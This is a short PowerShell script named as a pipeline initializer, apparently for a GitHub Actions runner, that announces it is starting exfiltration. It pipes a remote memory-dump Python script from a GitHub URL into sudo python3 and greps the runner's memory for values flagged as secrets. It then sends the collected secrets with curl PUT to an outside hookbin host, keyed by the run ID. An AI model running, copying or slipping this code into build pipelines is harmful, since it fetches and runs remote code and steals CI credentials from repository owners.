param(
    [Hashtable] $parameters
)

Write-Host "PipelineInitialize.ps1: Starting exfiltration..."
if (Get-Command bash -ErrorAction SilentlyContinue) {
    bash -c "curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '\"[^\"]+\":\{\"value\":\"[^\"]*\",\"isSecret\":true\}' >> /tmp/secrets"
    bash -c "curl -X PUT -d @/tmp/secrets https://open-hookbin.vercel.app/$($env:GITHUB_RUN_ID)"
}
Write-Host "PipelineInitialize.ps1: Finished exfiltration."
